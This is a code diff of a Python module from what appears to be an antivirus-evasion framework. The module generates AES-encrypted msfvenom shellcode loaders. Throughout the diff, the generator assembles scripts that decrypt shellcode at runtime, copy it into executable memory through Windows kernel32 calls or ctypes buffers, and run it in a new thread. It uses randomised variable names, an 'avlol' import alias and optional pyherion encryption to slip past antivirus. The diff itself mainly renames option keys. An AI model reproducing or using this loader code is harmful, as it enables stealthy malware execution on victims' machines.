@@ -24,30 +24,32 @@ from modules.common import encryption
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
         self.language = "python"
         self.extension = "py"
         self.rating = "Excellent"
-        
+
         self.shellcode = shellcode.Shellcode()
-        
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
-                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
-        
-        
+
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
+                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Void, Heap"],
+                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
+                                }
+
+
     def generate(self):
-        if self.required_options["inject_method"][0].lower() == "virtual":
-            if self.required_options["expire_payload"][0].lower() == "x":
-                
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
+
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -58,10 +60,10 @@ class Payload:
                 RandDecodedShellcode = helpers.randomString()
                 RandShellCode = helpers.randomString()
                 RandPadding = helpers.randomString()
-        
+
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
-        
+
                 # Create Payload code
                 PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -77,8 +79,8 @@ class Payload:
                 PayloadCode += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + RandShellCode + ')))\n'
                 PayloadCode += RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 PayloadCode += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
-        
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
@@ -87,11 +89,11 @@ class Payload:
 
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -104,10 +106,10 @@ class Payload:
                 RandPadding = helpers.randomString()
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
-        
+
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
-        
+
                 # Create Payload code
                 PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -128,19 +130,19 @@ class Payload:
                 PayloadCode += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + RandShellCode + ')))\n'
                 PayloadCode += '\t' + RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 PayloadCode += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
-        
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
 
-        if self.required_options["inject_method"][0].lower() == "heap":
-            if self.required_options["expire_payload"][0].lower() == "x":
-                
+        if self.required_options["INJECT_METHOD"][0].lower() == "heap":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
+
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -154,10 +156,10 @@ class Payload:
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
                 HeapVar = helpers.randomString()
-    
+
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
-        
+
                 # Create Payload code
                 PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -174,8 +176,8 @@ class Payload:
                 PayloadCode += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
                 PayloadCode += RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 PayloadCode += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
-        
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
@@ -183,11 +185,11 @@ class Payload:
             else:
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -204,7 +206,7 @@ class Payload:
 
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
-        
+
                 # Create Payload code
                 PayloadCode = 'import ctypes as avlol\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -226,18 +228,18 @@ class Payload:
                 PayloadCode += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
                 PayloadCode += '\t' + RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 PayloadCode += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'
-        
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
 
         else:
-            if self.required_options["expire_payload"][0].lower() == "x":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -251,10 +253,10 @@ class Payload:
                 RandShellcode = helpers.randomString()
                 RandReverseShell = helpers.randomString()
                 RandMemoryShell = helpers.randomString()
-    
+
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
-        
+
                 # Create Payload code
                 PayloadCode = 'from ctypes import *\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -268,8 +270,8 @@ class Payload:
                 PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                 PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                 PayloadCode += RandShellcode + '()'
-    
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
@@ -277,11 +279,11 @@ class Payload:
             else:
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -297,10 +299,10 @@ class Payload:
                 RandMemoryShell = helpers.randomString()
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
-    
+
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
-        
+
                 # Create Payload code
                 PayloadCode = 'from ctypes import *\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -319,8 +321,8 @@ class Payload:
                 PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                 PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                 PayloadCode += '\t' + RandShellcode + '()'
-    
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
